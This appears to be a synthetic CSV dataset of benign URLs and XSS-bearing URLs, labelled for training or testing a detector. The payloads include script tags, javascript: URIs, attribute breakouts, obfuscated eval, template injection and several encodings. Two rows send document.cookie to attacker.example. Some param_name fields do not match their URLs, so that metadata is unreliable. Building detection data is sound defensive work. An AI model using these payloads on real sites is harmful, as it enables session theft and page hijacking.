url,payload,carrier,param_name,encoded,notes,label
https://catalog.example/api?callback=category&id=1&ref=en,category,callback,utm_source,raw,benign,0
https://testsite.local/search?search=contact,contact,query,search,raw,benign,0
https://vulnerable.app/search?callback=&#x27;);document.location=&#x27;javascript:alert(1)&#x27;//&lang=google,');document.location='javascript:alert(1)'//,query,callback,html_entity,document_location_js,1
https://mysite.example/user/user/profile,user,path,,raw,benign,0
https://service.test/search?view=product&source=organic,product,query,view,raw,benign,0
https://mysite.example/api?callback=order&id=1,order,callback,page,raw,benign,0
https://mysite.example/search?q=2025-10-01,2025-10-01,query,q,raw,benign,0
https://mysite.example/search?callback=profile&lang=organic,profile,query,callback,raw,benign,0
"https://demo.example.org/search?search=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//&lang=1","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,search,raw,eval_obf,1
https://example.com/search?id=javascript:alert(1)&ref=en,javascript:alert(1),query,id,raw,js_uri,1
https://demo.example.org/user/javascript%3Aalert%281%29/profile,javascript:alert(1),path,,urlencoded,js_uri,1
https://sErvIce.test/page#<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,fragment,,raw,iframe_js_uri,1
https://testsite.local/search?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,callback,raw,meta_refresh_js_uri,1
https://testsite.local/search?input=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,input,raw,script_in_math,1
https://webapp.local/redirect?url=https://victim.example/?p=%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,redirect,s,mixed,inline_js_snippet,1
https://mysite.example/search?file=1&ref=1,1,query,file,raw,benign,0
https://demo.example.org/user/1/profile,1,path,,raw,benign,0
https://mysite.example/api?callback=about&id=1,about,callback,session,raw,benign,0
https://portal.example.net/user/%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E/profile,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,path,,urlencoded,script_in_math,1
https://portal.example.net/api?callback=2025-10-01&id=1,2025-10-01,callback,ref,raw,benign,0
https://catalog.example/search?q=item&session=en,item,query,q,raw,benign,0
https://demo.example.org/search?view=about,about,query,view,raw,benign,0
https://testsite.local/page#1,1,fragment,,raw,benign,0
https://service.test/user/product/profile,product,path,,raw,benign,0
https://vulnerable.app/search?id=<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,query,id,raw,iframe_js_uri,1
https://demo.example.org/search?term=about-2025&ref=affiliate,about-2025,query,term,raw,benign,0
https://demo.example.org/search?file=page,page,query,file,raw,benign,0
https://mysite.example/search?input=prices,prices,query,input,raw,benign,0
https://example.com/search?session=order,order,query,session,raw,benign,0
"https://webapp.local/page#""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",fragment,,raw,attribute_breakout_video,1
https://vulnerable.app/user/%3Cscript%3Ealert%281%29%3C%2Fscript%3E/profile,<script>alert(1)</script>,path,,urlencoded,script_tag,1
https://demo.example.org/page#%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E,<iframe src='javascript:alert(1)'></iframe>,fragment,,mixed,iframe_js_uri,1
https://example.com/search?utm_source=welcome,welcome,query,utm_source,raw,benign,0
https://mysite.example/search?session=signup&lang=google,signup,query,session,raw,benign,0
https://mysite.example/search?session=blog&source=affiliate,blog,query,session,raw,benign,0
https://demo.example.org/search?redirect=details&lang=organic,details,query,redirect,raw,benign,0
https://example.com/user/%27%29%3Balert%281%29%3B%2F%2F/profile,');alert(1);//,path,,urlencoded,inline_js_snippet,1
https://service.test/search?input=signup,signup,query,input,raw,benign,0
https://example.com/search?url=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,url,raw,cookie_exfil,1
https://demo.example.org/search?redirect=article,article,query,redirect,raw,benign,0
https://portal.example.net/search?page=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&lang=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,page,raw,meta_refresh_js_uri,1
https://example.com/api?callback=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&id=1&session=google,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,tmpl,mixed,eval_obf,1
https://blog.example/search?s=index-info,index-info,query,s,raw,benign,0
https://WebapP.Local/user/&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=javascript:alert(1)&#x27;&gt;/profile,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,path,,html_entity,meta_refresh_js_uri,1
https://testsite.local/search?id=index,index,query,id,raw,benign,0
https://shop.example/user/%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E/profile,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,path,,urlencoded,svg_cdata_script,1
https://webapp.local/search?lang=checkout,checkout,query,lang,raw,benign,0
https://shop.example/page#login,login,fragment,,raw,benign,0
https://webapp.local/user/%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E/profile,"""><video><source onerror=alert(1)></video>",path,,urlencoded,attribute_breakout_video,1
https://example.com/redirect?url=https://victim.example/?p={{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},redirect,q,raw,template_injection,1
https://demo.example.org/search?view=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>&lang=google,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,view,raw,script_in_math,1
https://example.com/page#javascript%3Aalert%281%29,javascript:alert(1),fragment,,urlencoded,js_uri,1
https://testsite.local/search?s=details&session=organic,details,query,s,raw,benign,0
https://service.test/search?lang=blog,blog,query,lang,raw,benign,0
https://example.com/page#signup,signup,fragment,,raw,benign,0
"https://example.com/search?query=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,query,raw,eval_obf,1
https://example.com/user/%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E/profile,"""><img src=x onerror=alert(1)>",path,,double_urlencoded,attribute_breakout_img,1
https://testsite.local/page#prices,prices,fragment,,raw,benign,0
https://example.com/api?callback=cart&id=1&source=0,cart,callback,q,raw,benign,0
https://blog.example/search?callback=user,user,query,callback,raw,benign,0
https://shop.example/search?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&lang=google,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,callback,raw,meta_refresh_js_uri,1
https://testsite.local/search?session=test-new&ref=0,test-new,query,session,raw,benign,0
https://shop.example/user/%22%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E/profile,"""><video><source onerror=alert(1)></video>",path,,mixed,attribute_breakout_video,1
https://blog.example/user/page/profile,page,path,,raw,benign,0
https://webapp.local/search?redirect=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,redirect,raw,meta_refresh_js_uri,1
https://shop.example/search?q=en&session=en,en,query,q,raw,benign,0
https://portal.example.net/search?view=profile80773,profile80773,query,view,raw,benign,0
https://example.com/redirect?url=https://victim.example/?p=page9414,page9414,redirect,input,raw,benign,0
https://example.com/search?input=<script>alert(1)</script>&lang=xyz,<script>alert(1)</script>,query,input,raw,script_tag,1
https://shop.example/search?ref=checkout,checkout,query,ref,raw,benign,0
https://portal.example.net/search?page=signup,signup,query,page,raw,benign,0
https://example.com/search?query=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,query,raw,svg_cdata_script,1
https://webapp.local/user/prices-2025/profile,prices-2025,path,,raw,benign,0
https://testsite.local/user/welcome/profile,welcome,path,,raw,benign,0
"https://testsite.local/search?callback=""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",query,callback,raw,attribute_breakout_video,1
https://portal.example.net/page#<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,fragment,,raw,iframe_js_uri,1
https://shop.example/search?q=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,q,raw,script_in_math,1
https://mysite.example/page#2025-10-01,2025-10-01,fragment,,raw,benign,0
https://portal.example.net/search?file=article10110,article10110,query,file,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=');alert(1);//&page=google,');alert(1);//,redirect,input,raw,inline_js_snippet,1
https://testsite.local/user/%253Cbody%2520onload%253Dalert%25281%2529%253E/profile,<body onload=alert(1)>,path,,double_urlencoded,body_onload,1
"https://shop.example/api?callback=""><svg onload=alert(1)>&id=1","""><svg onload=alert(1)>",callback,term,raw,attribute_breakout_svg,1
https://webapp.local/search?session=prices&lang=1,prices,query,session,raw,benign,0
https://webapp.local/api?callback=item&id=1,item,callback,term,raw,benign,0
https://example.com/user/1-info/profile,1-info,path,,raw,benign,0
https://shop.example/search?view=user&page=1,user,query,view,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=index&session=newsletter,index,redirect,page,raw,benign,0
https://portal.example.net/search?utm_source=order,order,query,utm_source,raw,benign,0
https://service.test/search?page=about,about,query,page,raw,benign,0
https://blog.example/user/signup/profile,signup,path,,raw,benign,0
https://portal.example.net/search?file=%257B%257Bconstructor.constructor%2528%2527alert%25281%2529%2527%2529%2528%2529%257D%257D,{{constructor.constructor('alert(1)')()}},query,file,double_urlencoded,template_injection,1
https://shop.example/search?callback=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,callback,html_entity,script_in_math,1
https://webapp.local/user/test/profile,test,path,,raw,benign,0
https://webapp.local/api?callback=product&id=1&lang=1,product,callback,callback,raw,benign,0
https://shop.example/api?callback=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&id=1&lang=google,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,callback,callback,urlencoded,script_in_math,1
https://mysite.example/user/welcome/profile,welcome,path,,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=signup,signup,redirect,q,raw,benign,0
https://demo.example.org/search?file=item,item,query,file,raw,benign,0
https://demo.example.org/search?url=&quot;&gt;&lt;svg onload=alert(1)&gt;,"""><svg onload=alert(1)>",query,url,html_entity,attribute_breakout_svg,1
https://testsite.local/search?name=index&session=newsletter,index,query,name,raw,benign,0
https://vulnerable.app/search?id=%253Cmath%253E%253Cmi%253E%253C%252Fmi%253E%253Cmfrac%253E%253Cmn%253E%253C%252Fmn%253E%253C%252Fmfrac%253E%253C%252Fmath%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,id,double_urlencoded,script_in_math,1
https://shop.example/redirect?url=https://victim.example/?p=%25253Cscript%25253Ealert%25281%2529%25253C%252Fscript%25253E&ref=1,%3Cscript%3Ealert(1)%3C/script%3E,redirect,file,double_urlencoded,already_encoded,1
https://catalog.example/redirect?url=https://victim.example/?p=2025-10-01&ref=newsletter,2025-10-01,redirect,name,raw,benign,0
https://blog.example/search?id=page-202555987,page-202555987,query,id,raw,benign,0
https://service.test/search?q=contact,contact,query,q,raw,benign,0
https://testsite.local/api?callback=%22%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E&id=1&lang=newsletter,"""><video><source onerror=alert(1)></video>",callback,callback,mixed,attribute_breakout_video,1
https://example.com/search?lang=home,home,query,lang,raw,benign,0
https://vulnerable.app/user/%253Cscript%253Ealert%281%29%253C%2Fscript%253E/profile,%3Cscript%3Ealert(1)%3C/script%3E,path,,urlencoded,already_encoded,1
https://portal.example.net/search?lang=about,about,query,lang,raw,benign,0
https://catalog.example/page#category,category,fragment,,raw,benign,0
https://testsite.local/page#javascript:alert(1),javascript:alert(1),fragment,,raw,js_uri,1
https://service.test/user/%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E/profile,<iframe src='javascript:alert(1)'></iframe>,path,,urlencoded,iframe_js_uri,1
https://example.com/search?redirect=login,login,query,redirect,raw,benign,0
https://service.test/search?session=page&source=1,page,query,session,raw,benign,0
https://example.com/page#javascript%3Aalert%281%29,javascript:alert(1),fragment,,mixed,js_uri,1
https://service.test/search?input=contact&ref=en,contact,query,input,raw,benign,0
https://service.test/search?q=welcome&page=1,welcome,query,q,raw,benign,0
https://mysite.example/search?utm_source=news,news,query,utm_source,raw,benign,0
https://webapp.local/search?file=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&session=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,file,urlencoded,meta_refresh_js_uri,1
https://shop.example/user/&lt;script&gt;fetch(&#x27;http://attacker.example/steal?c=&#x27;+document.cookie)&lt;/script&gt;/profile&lang=1,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,html_entity,cookie_exfil,1
https://example.com/page#welcome,welcome,fragment,,raw,benign,0
https://catalog.example/search?query=home,home,query,query,raw,benign,0
https://service.test/user/%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E/profile,<script>alert(1)</script>,path,,double_urlencoded,script_tag,1
https://webapp.local/search?file=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&utm_source=google,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,file,raw,svg_cdata_script,1
https://portal.example.net/search?s=details&session=organic,details,query,s,raw,benign,0
https://vulnerable.app/search?q=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E&lang=0,<iframe src='javascript:alert(1)'></iframe>,query,q,urlencoded,iframe_js_uri,1
https://vulnerable.app/search?input={{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},query,input,raw,template_injection,1
https://webapp.local/search?utm_source=checkout&lang=0,checkout,query,utm_source,raw,benign,0
https://example.com/search?name=article,article,query,name,raw,benign,0
https://Webapp.LocAl/user/{{constructor.constructor('alert(1)')()}}/profile,{{constructor.constructor('alert(1)')()}},path,,raw,template_injection,1
